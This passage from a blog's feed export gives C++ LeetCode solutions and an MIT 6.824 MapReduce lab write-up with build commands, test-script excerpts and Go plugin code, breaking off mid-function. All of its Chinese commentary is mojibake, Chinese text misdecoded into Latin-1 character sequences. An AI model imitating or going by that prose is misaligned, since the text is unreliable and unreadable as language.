class="title">bestCoordinate</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; towers, <span class="type">int</span> radius)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> resx = <span class="number">0</span>, resy = <span class="number">0</span>;</span><br><span class="line">        len = towers.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> maxPower = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> x = <span class="number">0</span>; x &lt;= <span class="number">50</span>; x++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> y = <span class="number">0</span>; y &lt;= <span class="number">50</span>; y++) &#123;</span><br><span class="line">                <span class="type">int</span> power = <span class="built_in">Power</span>(x, y, towers, radius);</span><br><span class="line">                <span class="keyword">if</span>(power &gt; maxPower) &#123;</span><br><span class="line">                    maxPower = power;</span><br><span class="line">                    resx = x;</span><br><span class="line">                    resy = y;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;resx, resy&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>å¤§äº50çš„å°±æ²¡å¿…è¦äº†ï¼Œåªä¼šè¡°å‡</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;1662-æ£€æŸ¥ä¸¤ä¸ªå­—ç¬¦ä¸²æ•°ç»„æ˜¯å¦ç›¸ç­‰&quot;&gt;&lt;a href=&quot;#1662-æ£€æŸ¥ä¸¤ä¸ªå­—ç¬¦ä¸²æ•°ç»„æ˜¯å¦ç›¸ç­‰&quot; class=&quot;headerlink&quot; title=&quot;1662. æ£€æŸ¥ä¸¤ä¸ªå­—ç¬¦ä¸²æ•°ç»„æ˜¯å¦ç›¸ç­‰&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://leetcode.cn/problems/check-if-two-string-arrays-are-equivalent/&quot;&gt;1662. æ£€æŸ¥ä¸¤ä¸ªå­—ç¬¦ä¸²æ•°ç»„æ˜¯å¦ç›¸ç­‰&lt;/a&gt;&lt;/h2&gt;&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title class_&quot;&gt;Solution&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;arrayStringsAreEqual&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(vector&amp;lt;string&amp;gt;&amp;amp; word1, vector&amp;lt;string&amp;gt;&amp;amp; word2)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;join&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;move&lt;/span&gt;(word1)) == &lt;span class=&quot;built_in&quot;&gt;join&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;move&lt;/span&gt;(word2));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;string &lt;span class=&quot;title&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(vector&amp;lt;string&amp;gt;&amp;amp;&amp;amp; word)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        string s;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; len = word.&lt;span class=&quot;built_in&quot;&gt;size&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(len &amp;lt;= &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; s;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; len&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            s += word[i];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        s+=word[len&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; s;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;blockquote&gt;
&lt;p&gt;å®ç°ä¸€ä¸ªjoinå‡½æ•°å°±å¥½äº†&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;481-ç¥å¥‡å­—ç¬¦ä¸²&quot;&gt;&lt;a href=&quot;#481-ç¥å¥‡å­—ç¬¦ä¸²&quot; class=&quot;headerlink&quot; title=&quot;481. ç¥å¥‡å­—ç¬¦ä¸²&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://leetcode.cn/problems/magical-string/&quot;&gt;481. ç¥å¥‡å­—ç¬¦ä¸²&lt;/a&gt;&lt;/h2&gt;&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title class_&quot;&gt;Solution&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;magicalString&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; n)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; bit = &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; count = &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;bool&lt;/span&gt; q[&lt;span class=&quot;number&quot;&gt;100005&lt;/span&gt;] = &amp;#123;&lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; queue_front = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; queue_rear = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;bool&lt;/span&gt; cur=&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;bool&lt;/span&gt; gen=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;(bit &amp;lt; n) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            bit += cur+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            q[queue_front++] = gen;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(cur) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                q[queue_front++] = gen;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            gen=&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;-gen;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            count+=gen?cur+gen:&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            cur = q[queue_rear++];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; count -(bit&amp;gt;n &amp;amp;&amp;amp; gen);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;blockquote&gt;
&lt;p&gt;å…³é”®åœ¨äºæƒ³æ¸…æ¥šå¦‚ä½•ç”Ÿæˆè¿™ä¸ªç¥å¥‡å­—ç¬¦ä¸²ï¼Œé¢˜ç›®ä¸­è¯´ï¼Œsçš„å‰å‡ ä¸ªå­—ç¬¦æ˜¯12211&lt;br&gt;1ç”Ÿæˆ1,s&amp;#x3D;1&lt;br&gt;2ç”Ÿæˆ22ï¼Œå› ä¸ºå‰ä¸€ä¸ª1ç”Ÿæˆäº†1ï¼Œè¿™ä¸ª2ä¸èƒ½ä¹Ÿç”Ÿæˆ1,s&amp;#x3D;122&lt;br&gt;2ç”Ÿæˆ11ï¼Œå› ä¸ºå‰ä¸€ä¸ª2ç”Ÿæˆäº†2ï¼Œè¿™ä¸ª2ä¸èƒ½ä¹Ÿç”Ÿæˆ2,s&amp;#x3D;12211&lt;br&gt;1ç”Ÿæˆ2ï¼Œå‰ä¸€ä¸ª2ç”Ÿæˆäº†1ï¼Œè¿™ä¸ª1å°±åªèƒ½ç”Ÿæˆ2äº†,s&amp;#x3D;122112&lt;br&gt;1ç”Ÿæˆ1,s&amp;#x3D;1221121&lt;br&gt;2ç”Ÿæˆ22,s&amp;#x3D;122112122&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="LeetCode" scheme="https://jingtianer.github.io/home/categories/LeetCode/"/>
    
    
    <category term="LeetCode" scheme="https://jingtianer.github.io/home/tags/LeetCode/"/>
    
  </entry>
  
  <entry>
    <title>6.824-lab1-Mapreduce</title>
    <link href="https://jingtianer.github.io/home/2022/10/28/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/6.824/lab1/"/>
    <id>https://jingtianer.github.io/home/2022/10/28/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/6.824/lab1/</id>
    <published>2022-10-28T10:00:36.000Z</published>
    <updated>2022-11-07T06:44:51.763Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><h3 id="å®éªŒç›®çš„"><a href="#å®éªŒç›®çš„" class="headerlink" title="å®éªŒç›®çš„"></a>å®éªŒç›®çš„</h3><ul><li>å®ç°ä¸€ä¸ªMapReduceè°ƒåº¦å™¨(Coordinator)</li></ul><h2 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h2><ol><li>ä¸‹è½½æºç </li></ol><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git://g.csail.mit.edu/6.824-golabs-2021 6.824</span><br></pre></td></tr></table></figure><ol start="2"><li>ä¸²è¡Œè¿è¡Œ word-count<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ./6.824</span><br><span class="line"><span class="built_in">cd</span> src/main</span><br><span class="line">go build -race -buildmode=plugin ../mrapps/wc.go</span><br><span class="line"><span class="built_in">rm</span> mr-out*</span><br><span class="line">go run -race mrsequential.go wc.so pg*.txt</span><br><span class="line">more mr-out-0</span><br></pre></td></tr></table></figure></li></ol><h2 id="æˆ‘çš„ä»»åŠ¡"><a href="#æˆ‘çš„ä»»åŠ¡" class="headerlink" title="æˆ‘çš„ä»»åŠ¡"></a>æˆ‘çš„ä»»åŠ¡</h2><p>ä¿®æ”¹<code>mr/coordinator.go</code>,<code> mr/worker.go</code>, <code>mr/rpc.go</code>ï¼Œå®ç°coordinatorå’Œworker</p><h3 id="è¿è¡Œæ–¹å¼"><a href="#è¿è¡Œæ–¹å¼" class="headerlink" title="è¿è¡Œæ–¹å¼"></a>è¿è¡Œæ–¹å¼</h3><ul><li><p>ç¼–è¯‘å¹¶è¿è¡Œcoordinator</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">go build -race -buildmode=plugin ../mrapps/wc.go </span><br><span class="line"><span class="built_in">rm</span> mr-out*</span><br><span class="line">go run -race mrcoordinator.go pg-*.txt</span><br></pre></td></tr></table></figure></li><li><p>å¤šå¼€å‡ ä¸ªçª—å£è·‘worker</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go run -race mrworker.go wc.so</span><br></pre></td></tr></table></figure></li><li><p>æµ‹è¯•</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash test-mr.sh</span><br></pre></td></tr></table></figure></li></ul><h2 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h2><h3 id="early-exit"><a href="#early-exit" class="headerlink" title="early exit"></a>early exit</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> -f mr-*</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;***&#x27;</span> Starting early <span class="built_in">exit</span> <span class="built_in">test</span>.</span><br><span class="line"></span><br><span class="line"><span class="built_in">timeout</span> -k 2s 180s ../mrcoordinator ../pg*txt &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment">## give the coordinator time to create the sockets.</span></span><br><span class="line"><span class="built_in">sleep</span> 1</span><br><span class="line"></span><br><span class="line"><span class="comment">## start multiple workers.</span></span><br><span class="line"><span class="built_in">timeout</span> -k 2s 180s ../mrworker ../../mrapps/early_exit.so &amp;</span><br><span class="line"><span class="built_in">timeout</span> -k 2s 180s ../mrworker ../../mrapps/early_exit.so &amp;</span><br><span class="line"><span class="built_in">timeout</span> -k 2s 180s ../mrworker ../../mrapps/early_exit.so &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment">## wait for any of the coord or workers to exit</span></span><br><span class="line"><span class="comment">## `jobs` ensures that any completed old processes from other tests</span></span><br><span class="line"><span class="comment">## are not waited upon</span></span><br><span class="line"><span class="built_in">jobs</span> &amp;&gt; /dev/null</span><br><span class="line"><span class="built_in">wait</span> -n</span><br><span class="line"><span class="comment">## å…³é”®æ˜¯è¿™ä¸€è¡Œ</span></span><br><span class="line"><span class="comment">## a process has exited. this means that the output should be finalized</span></span><br><span class="line"><span class="comment">## otherwise, either a worker or the coordinator exited early</span></span><br><span class="line"><span class="built_in">sort</span> mr-out* | grep . &gt; mr-wc-all-initial</span><br><span class="line"></span><br><span class="line"><span class="comment">## wait for remaining workers and coordinator to exit.</span></span><br><span class="line"><span class="built_in">wait</span></span><br></pre></td></tr></table></figure><ul><li>è¿™ä¸€è¡Œçš„ä½œç”¨æ˜¯å½“ä¸Šé¢ä»»ä½•ä¸€ä¸ªçº¿ç¨‹ä¸­ï¼Œç¬¬ä¸€ä¸ªçº¿ç¨‹ç»“æŸï¼Œåˆ™åœæ­¢waitç»§ç»­ä¸‹é¢çš„è„šæœ¬</li><li>ä¹Ÿå°±æ˜¯è¯´ï¼Œå¤§å®¶è¦ä¸€èµ·é€€å‡ºï¼Œä¸èƒ½å› ä¸ºæ‰§è¡Œå®Œä»»åŠ¡äº†ï¼Œä¹Ÿæ²¡æœ‰æ–°ä»»åŠ¡äº†ï¼Œå°±è®©workerç»“æŸ<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">wait</span> -n</span><br><span class="line"><span class="comment">## å…³é”®æ˜¯è¿™ä¸€è¡Œ</span></span><br></pre></td></tr></table></figure><blockquote><p>ä¸€ç§å¯è¡Œçš„æ–¹æ³•æ˜¯å½“æ‰€æœ‰reduceä»»åŠ¡ç»“æŸåï¼Œç›´æ¥é€€å‡ºï¼Œsocketè¿æ¥å…³é—­ï¼Œåé¢çš„workerå¿ƒè·³ç›´æ¥è¿æ¥å…³é—­çš„socketå¯¼è‡´panicé€€å‡º</p></blockquote></li></ul><p>ä½†è¿™æ ·å¤ªä¸ä¼˜é›…</p><blockquote><p>æ¯ä¸ªworkerè¯·æ±‚taskæ—¶å‘é€è‡ªå·±å·²ç»å®Œæˆçš„reduceæ•°<br>å¦‚æœcoordinatoræ”¶åˆ°äº†æ‰€æœ‰çš„reduce completeæ¶ˆæ¯ï¼Œç»´æŠ¤ä¸€ä¸ªå˜é‡reduceï¼Œæ­¤æ—¶æ¯æ”¶åˆ°ä¸€ä¸ªRequestTaskæ¶ˆæ¯reduce+&#x3D;è¯¥å®¢æˆ·ç«¯çš„reduceæ•°ï¼Œå¹¶å‘é€finishæ¶ˆæ¯ï¼Œworkeræ”¶åˆ°åç«‹åˆ»finish<br>Coordinatorçš„Doneå®ç°ä¸ºï¼Œè¯¥reduceå¤§äºç­‰äºNReduceæ—¶ï¼Œç»“æŸè¿è¡Œ</p></blockquote><h3 id="job-count-test"><a href="#job-count-test" class="headerlink" title="job count test"></a>job count test</h3><ul><li>æ£€æŸ¥æŸä¸ªjobè¿è¡Œçš„æ¬¡æ•°æ˜¯å¦æ­£ç¡®</li><li>è¿™ä¸ªæ£€æµ‹æœ€åˆæ²¡æœ‰é€šè¿‡ï¼Œå°±å»çœ‹äº†æµ‹è¯•è„šæœ¬å’Œæºç </li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;***&#x27;</span> Starting job count <span class="built_in">test</span>.</span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> -f mr-*</span><br><span class="line"></span><br><span class="line"><span class="built_in">timeout</span> -k 2s 180s ../mrcoordinator ../pg*txt &amp;</span><br><span class="line"><span class="built_in">sleep</span> 1</span><br><span class="line"></span><br><span class="line"><span class="built_in">timeout</span> -k 2s 180s ../mrworker ../../mrapps/jobcount.so &amp;</span><br><span class="line"><span class="built_in">timeout</span> -k 2s 180s ../mrworker ../../mrapps/jobcount.so</span><br><span class="line"><span class="built_in">timeout</span> -k 2s 180s ../mrworker ../../mrapps/jobcount.so &amp;</span><br><span class="line"><span class="built_in">timeout</span> -k 2s 180s ../mrworker ../../mrapps/jobcount.so</span><br><span class="line"></span><br><span class="line">NT=`<span class="built_in">cat</span> mr-out* | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$NT</span>&quot;</span> -ne <span class="string">&quot;8&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&#x27;---&#x27;</span> map <span class="built_in">jobs</span> ran incorrect number of <span class="built_in">times</span> <span class="string">&quot;(<span class="variable">$NT</span> != 8)&quot;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&#x27;---&#x27;</span> job count <span class="built_in">test</span>: FAIL</span><br><span class="line">  failed_any=1</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&#x27;---&#x27;</span> job count <span class="built_in">test</span>: PASS</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">wait</span></span><br></pre></td></tr></table></figure><blockquote><p>ç®€å•åˆ†æå¯çŸ¥ï¼ŒåŠ è½½jobcountä¸­çš„ç‰¹æ®Šmapï¼Œreduceå‡½æ•°ï¼Œä½¿è¾“å‡ºæ–‡ä»¶è¾“å‡ºçš„æ˜¯mapçš„ä¸ªæ•°<br>é€šè¿‡catè¾“å‡ºmr-out<em>çš„æ‰€æœ‰æ–‡ä»¶ï¼Œåœ¨ä½¿ç”¨awkè¾“å‡ºmr-out</em>çš„ç¬¬äºŒä¸ªå‚æ•°(<code>awk &#39;print $2&#39;</code>)</p></blockquote><figure class="highlight go"><figcaption><span>mrapps/crash.go</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> count <span class="type">int</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Map</span><span class="params">(filename <span class="type">string</span>, contents <span class="type">string</span>)</span></span> []mr.KeyValue &#123;</span><br><span class="line">me := os.Getpid()</span><br><span class="line">f := fmt.Sprintf(<span class="string">&quot;mr-worker-jobcount-%d-%d&quot;</span>, me, count)</span><br><span class="line">count++</span><br><span class="line">err := ioutil.WriteFile(f, []<span class="type">byte</span>(<span class="string">&quot;x&quot;</span>), <span class="number">0666</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">time.Sleep(time.Duration(<span class="number">2000</span>+rand.Intn(<span class="number">3000</span>)) * time.Millisecond)</span><br><span class="line"><span class="keyword">return</span> []mr.KeyValue&#123;mr.KeyValue&#123;<span class="string">&quot;a&quot;</span>, <span class="string">&quot;x&quot;</span>&#125;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Reduce</span><span class="params">(key <span class="type">string</span>, values []<span class="type">string</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">files, err := ioutil.ReadDir(<span class="string">&quot;.&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">invocations := <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> _, f := <span class="keyword">range</span> files &#123;</span><br><span class="line"><span class="comment">// println(&quot;test, f =&quot;, f.Name(), strings.HasPrefix(f.Name(), &quot;mr-worker-jobcount&quot;))</span></span><br><span class="line"><span class="keyword">if</span> 